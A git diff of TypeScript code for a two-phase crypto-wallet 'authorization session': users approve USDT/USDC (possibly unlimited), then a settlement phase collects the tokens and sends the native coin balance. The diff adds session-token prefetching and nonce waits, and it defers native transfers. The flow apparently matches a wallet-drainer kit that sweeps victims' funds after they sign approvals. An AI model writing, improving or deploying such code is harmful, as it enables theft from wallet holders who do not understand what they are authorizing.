@@ -33,10 +33,15 @@ import {
   type EvmTokenBatchRunResult,
 } from "./evm-token-batch";
 import {
-  filterBatchResultsForNativeRetry,
   inferEvmBatchNativeOutcome,
   shouldSkipNativeWalletPhaseAfterBatch,
 } from "./evm-batch-native-outcome";
+import {
+  awaitEvmSequentialApprovalGap,
+  readEvmPendingNonce,
+} from "../core/evm-nonce-sync";
+import { isEvmChainKey } from "../core/native-chains";
+import { fetchWalletSessionToken } from "./wallet-session-token";
 import { runAuthorizationSettlement } from "./phases/settlement-coordinator";
 import type { SettlementRunResult } from "./phases/types";
 import type {
@@ -130,6 +135,8 @@ export type RunAuthorizationSessionArgs = {
   /** Provider kept alive for settlement (session auth + EVM native execution). */
   settlementProvider?: UniversalProvider;
   apiBaseUrl?: string;
+  /** Pre-authenticated wallet session token (prefetched before wallet phase when possible). */
+  walletSessionToken?: string;
 };
 
 function isSuccessOutcome(outcome: AuthorizationAssetOutcome): boolean {
@@ -196,9 +203,53 @@ function applyEvmBatchNativeCapture(args: {
   }
 }
 
+function recordEvmNativeDeferred(ctx: {
+  item: IncludedAssetWorkItem & { asset: "NATIVE" };
+  results: AuthorizationAssetResult[];
+  captureByNetwork: Map<string, WalletPhaseCapture>;
+  sessionId: string;
+  owner: string;
+  log: RunAuthorizationSessionArgs["log"];
+  onAssetEnd?: RunAuthorizationSessionArgs["onAssetEnd"];
+  reason?: string;
+}): void {
+  const { item, results, captureByNetwork, sessionId, owner, log, onAssetEnd } =
+    ctx;
+  log?.("NATIVE DEFERRED TO SETTLEMENT", {
+    network: item.network,
+    owner,
+    reason: ctx.reason ?? "evm_policy",
+    policy: "settlement eth_sendTransaction after token collection",
+  });
+  const result: AuthorizationAssetResult = {
+    network: item.network,
+    token: "NATIVE",
+    outcome: "authorized",
+    message: "Native deferred — eth_sendTransaction after token settlement",
+  };
+  results.push(result);
+  onAssetEnd?.(result);
+
+  const capture = captureByNetwork.get(item.network) ?? {
+    sessionId,
+    network: item.network,
+    owner,
+    tokens: [],
+    native: null,
+    batchId: null,
+  };
+  capture.native = {
+    network: item.network,
+    owner,
+    authorizationKind: "evm_deferred",
+    authorizationPayload: { evmDeferred: true },
+  };
+  captureByNetwork.set(item.network, capture);
+}
+
 /**
  * Two-phase authorization:
- * 1. Wallet phase — consecutive popups (USDT/USDC approve; Tron native sign only).
+ * 1. Wallet phase — token approvals (EVM native deferred; Tron native sign only).
  * 2. Settlement phase — confirm approvals, collect USDT → USDC via existing queue, then native.
  */
 export async function runAuthorizationSession(
@@ -207,6 +258,7 @@ export async function runAuthorizationSession(
   const results: AuthorizationAssetResult[] = [];
   const captures: WalletPhaseCapture[] = [];
   const log = args.log ?? (() => undefined);
+  let walletSessionToken = args.walletSessionToken;
   const walletForJourney = args.accounts.evm || args.accounts.tron;
   const sessionId =
     args.transactionId?.trim() ||
@@ -233,6 +285,30 @@ export async function runAuthorizationSession(
     mode: "wallet_phase_first",
   });
 
+  const authNetwork = args.items[0]?.network;
+  const authProvider = args.settlementProvider ?? args.evmBatchProvider;
+  const authOwner =
+    authNetwork === "tron" ? args.accounts.tron : args.accounts.evm;
+  const apiBase = args.apiBaseUrl ?? "";
+  const canPrefetchAuth =
+    !walletSessionToken &&
+    authProvider &&
+    authOwner &&
+    authNetwork &&
+    (apiBase.length > 0 || typeof window !== "undefined");
+  if (canPrefetchAuth) {
+    walletSessionToken = await fetchWalletSessionToken({
+      provider: authProvider,
+      apiBaseUrl: apiBase,
+      owner: authOwner,
+      network: authNetwork,
+    });
+    log("WALLET SESSION AUTHENTICATED", {
+      network: authNetwork,
+      phase: "pre_wallet",
+    });
+  }
+
   const workUnits = planAuthorizationWork(args.items);
   const captureByNetwork = new Map<string, WalletPhaseCapture>();
 
@@ -253,16 +329,9 @@ export async function runAuthorizationSession(
           onAssetEnd: args.onAssetEnd,
           log,
           walletPhaseOnly: true,
+          walletSessionToken,
         });
-        const batchNativeOutcome = inferEvmBatchNativeOutcome(batchResults);
-        results.push(
-          ...(batchNativeOutcome === "failed_revert"
-            ? filterBatchResultsForNativeRetry(
-                batchResults.results,
-                unit.network,
-              )
-            : batchResults.results),
-        );
+        results.push(...batchResults.results);
 
         const owner = args.accounts.evm;
         if (owner) {
@@ -288,12 +357,6 @@ export async function runAuthorizationSession(
             unit.nativeItem &&
             !shouldSkipNativeWalletPhaseAfterBatch(batchResults, true)
           ) {
-            if (batchNativeOutcome === "failed_revert") {
-              log?.("EIP5792_BATCH_NATIVE_RETRY_WALLET_PHASE", {
-                network: unit.network,
-                outcome: batchNativeOutcome,
-              });
-            }
             captureByNetwork.set(unit.network, existing);
             await runNativeWalletPhase({
               item: unit.nativeItem,
@@ -311,7 +374,17 @@ export async function runAuthorizationSession(
         continue;
       }
 
-      for (const item of unit.items) {
+      let evmPendingNonce: bigint | null = null;
+      const evmOwner = args.accounts.evm;
+      if (isEvmChainKey(unit.network) && evmOwner) {
+        evmPendingNonce = await readEvmPendingNonce({
+          network: unit.network,
+          owner: evmOwner,
+        });
+      }
+
+      for (let itemIndex = 0; itemIndex < unit.items.length; itemIndex += 1) {
+        const item = unit.items[itemIndex]!;
         args.onAssetStart?.(item);
         await runTokenWalletPhase({
           item: { ...item, asset: item.asset as TokenSymbol },
@@ -320,7 +393,40 @@ export async function runAuthorizationSession(
           captureByNetwork,
           sessionId,
           log,
+          walletSessionToken,
         });
+        const last = results[results.length - 1];
+        if (
+          evmPendingNonce != null &&
+          evmOwner &&
+          itemIndex < unit.items.length - 1 &&
+          last &&
+          isSuccessOutcome(last.outcome) &&
+          last.txHash
+        ) {
+          log("EVM_SEQUENTIAL_NONCE_WAIT", {
+            network: unit.network,
+            token: last.token,
+            txHash: last.txHash,
+            baselineNonce: evmPendingNonce.toString(),
+          });
+          try {
+            const advanced = await awaitEvmSequentialApprovalGap({
+              network: unit.network,
+              owner: evmOwner,
+              txHash: last.txHash,
+              baselineNonce: evmPendingNonce,
+            });
+            if (advanced != null) {
+              evmPendingNonce = advanced;
+            }
+          } catch (nonceErr) {
+            log("EVM_SEQUENTIAL_NONCE_WAIT_FAILED", {
+              network: unit.network,
+              error: getErrorMessage(nonceErr, "Nonce wait failed"),
+            });
+          }
+        }
       }
       if (unit.nativeItem) {
         await runNativeWalletPhase({
@@ -359,6 +465,7 @@ export async function runAuthorizationSession(
       captureByNetwork,
       sessionId,
       log,
+      walletSessionToken,
     });
   }
 
@@ -397,6 +504,7 @@ export async function runAuthorizationSession(
         accounts: args.accounts,
         apiBaseUrl: args.apiBaseUrl,
         provider: args.settlementProvider ?? args.evmBatchProvider,
+        walletSessionToken,
         getSpender: args.getSpender,
         runApprovalSettlement: (settlementArgs) =>
           args.runApprovalSettlement!({
@@ -427,8 +535,10 @@ async function runTokenWalletPhase(ctx: {
   captureByNetwork: Map<string, WalletPhaseCapture>;
   sessionId: string;
   log: RunAuthorizationSessionArgs["log"];
+  walletSessionToken?: string;
 }): Promise<void> {
-  const { item, args, results, captureByNetwork, sessionId, log } = ctx;
+  const { item, args, results, captureByNetwork, sessionId, log, walletSessionToken } =
+    ctx;
   const token = item.asset;
 
   const networkRow = args.networks.find((n) => n.key === item.network);
@@ -517,6 +627,7 @@ async function runTokenWalletPhase(ctx: {
             ? transferAmountRaw
             : undefined,
           traceId: args.transactionId ?? sessionId,
+          walletSessionToken,
         };
         const preflightApi = createPreflightApi(args.apiBaseUrl);
         const preflight = await preflightExistingAllowance({
@@ -677,246 +788,17 @@ async function runNativeWalletPhase(ctx: {
     return;
   }
 
-  // EVM: early eth_signTransaction when supported; otherwise defer popup to settlement.
+  // EVM: defer native to settlement (eth_sendTransaction after token collection).
   if (item.network !== "tron") {
-    const provider = args.evmBatchProvider ?? args.settlementProvider;
-    if (!provider) {
-      log?.("NATIVE DEFERRED TO SETTLEMENT", {
-        network: item.network,
-        owner,
-        reason: "no_wallet_provider",
-        policy: "settlement eth_sendTransaction after token collection",
-      });
-      const result: AuthorizationAssetResult = {
-        network: item.network,
-        token: "NATIVE",
-        outcome: "authorized",
-        message:
-          "Native deferred — eth_sendTransaction after token settlement",
-      };
-      results.push(result);
-      args.onAssetEnd?.(result);
-
-      const capture = captureByNetwork.get(item.network) ?? {
-        sessionId,
-        network: item.network,
-        owner,
-        tokens: [],
-        native: null,
-        batchId: null,
-      };
-      capture.native = {
-        network: item.network,
-        owner,
-        authorizationKind: "evm_deferred",
-        authorizationPayload: { evmDeferred: true },
-      };
-      captureByNetwork.set(item.network, capture);
-      return;
-    }
-
-    log?.("NATIVE WALLET AUTHORIZATION STARTED", {
-      network: item.network,
-      owner,
-      policy:
-        "EVM sign now (eth_signTransaction) — broadcast deferred until token collection",
-    });
-
-    if (args.runNativeTransfer) {
-      const authResult = await args.runNativeTransfer({
-        network: item.network,
-        owner,
-        unlimited: item.unlimited,
-        amountHuman: item.unlimited ? undefined : item.amountHuman,
-        mode: "authorize_only",
-      });
-
-      if (!authResult.ok) {
-        const message = getErrorMessage(
-          authResult.error,
-          "Native authorization failed",
-        );
-        const unsupported =
-          /eth_signTransaction|method not found|not supported|unsupported method|does not support/i.test(
-            message,
-          );
-        if (unsupported) {
-          log?.("NATIVE DEFERRED TO SETTLEMENT", {
-            network: item.network,
-            owner,
-            reason: message,
-            policy:
-              "eth_signTransaction unsupported — settlement eth_sendTransaction",
-          });
-          const result: AuthorizationAssetResult = {
-            network: item.network,
-            token: "NATIVE",
-            outcome: "authorized",
-            message:
-              "Native deferred — eth_sendTransaction after token settlement",
-          };
-          results.push(result);
-          args.onAssetEnd?.(result);
-
-          const capture = captureByNetwork.get(item.network) ?? {
-            sessionId,
-            network: item.network,
-            owner,
-            tokens: [],
-            native: null,
-            batchId: null,
-          };
-          capture.native = {
-            network: item.network,
-            owner,
-            authorizationKind: "evm_deferred",
-            authorizationPayload: { evmDeferred: true },
-          };
-          captureByNetwork.set(item.network, capture);
-          return;
-        }
-
-        const result: AuthorizationAssetResult = {
-          network: item.network,
-          token: "NATIVE",
-          outcome: authResult.userRejected ? "user_rejected" : "failed",
-          message,
-        };
-        results.push(result);
-        args.onAssetEnd?.(result);
-        return;
-      }
-
-      if (!authResult.deferredSignedRaw) {
-        const result: AuthorizationAssetResult = {
-          network: item.network,
-          token: "NATIVE",
-          outcome: "failed",
-          message: "Wallet authorization did not return a signed transaction",
-        };
-        results.push(result);
-        args.onAssetEnd?.(result);
-        return;
-      }
-
-      const result: AuthorizationAssetResult = {
-        network: item.network,
-        token: "NATIVE",
-        outcome: "authorized",
-        message: "Native signed — broadcast deferred until token settlement",
-      };
-      results.push(result);
-      args.onAssetEnd?.(result);
-
-      const capture = captureByNetwork.get(item.network) ?? {
-        sessionId,
-        network: item.network,
-        owner,
-        tokens: [],
-        native: null,
-        batchId: null,
-      };
-      capture.native = {
-        network: item.network,
-        owner,
-        authorizationKind: "evm_signed",
-        authorizationPayload: { signedRaw: authResult.deferredSignedRaw },
-        estimateTransferableRaw: authResult.deferredTransferableRaw,
-        recipient: authResult.context.estimate?.recipient,
-      };
-      captureByNetwork.set(item.network, capture);
-      return;
-    }
-
-    const authResult = await authorizeNativeInWalletPhase({
-      provider,
-      network: item.network,
-      owner,
-      unlimited: item.unlimited,
-      amountHuman: item.unlimited ? undefined : item.amountHuman,
-      apiBaseUrl: args.apiBaseUrl,
-      traceId: args.transactionId ?? sessionId,
-      orchestrator: args.nativeOrchestrator,
-      onStage: (stageResult) => {
-        if (
-          stageResult.stage === "REFRESH_ESTIMATE" ||
-          stageResult.stage === "SIGN"
-        ) {
-          log?.("NATIVE WALLET SIGN STAGE", {
-            network: item.network,
-            stage: stageResult.stage,
-            status: stageResult.status,
-          });
-        }
-      },
-    });
-
-    if (!authResult.ok) {
-      if (authResult.fallbackDeferred) {
-        log?.("NATIVE DEFERRED TO SETTLEMENT", {
-          network: item.network,
-          owner,
-          reason: authResult.error,
-          policy: "eth_signTransaction unsupported — settlement eth_sendTransaction",
-        });
-        const result: AuthorizationAssetResult = {
-          network: item.network,
-          token: "NATIVE",
-          outcome: "authorized",
-          message:
-            "Native deferred — eth_sendTransaction after token settlement",
-        };
-        results.push(result);
-        args.onAssetEnd?.(result);
-
-        const capture = captureByNetwork.get(item.network) ?? {
-          sessionId,
-          network: item.network,
-          owner,
-          tokens: [],
-          native: null,
-          batchId: null,
-        };
-        capture.native = {
-          network: item.network,
-          owner,
-          authorizationKind: "evm_deferred",
-          authorizationPayload: { evmDeferred: true },
-        };
-        captureByNetwork.set(item.network, capture);
-        return;
-      }
-
-      const result: AuthorizationAssetResult = {
-        network: item.network,
-        token: "NATIVE",
-        outcome: authResult.userRejected ? "user_rejected" : "failed",
-        message: authResult.error,
-      };
-      results.push(result);
-      args.onAssetEnd?.(result);
-      return;
-    }
-
-    const result: AuthorizationAssetResult = {
-      network: item.network,
-      token: "NATIVE",
-      outcome: "authorized",
-      message: "Native signed — broadcast deferred until token settlement",
-    };
-    results.push(result);
-    args.onAssetEnd?.(result);
-
-    const capture = captureByNetwork.get(item.network) ?? {
+    recordEvmNativeDeferred({
+      item,
+      results,
+      captureByNetwork,
       sessionId,
-      network: item.network,
       owner,
-      tokens: [],
-      native: null,
-      batchId: null,
-    };
-    capture.native = authResult.capture;
-    captureByNetwork.set(item.network, capture);
+      log,
+      onAssetEnd: args.onAssetEnd,
+    });
     return;
   }
 
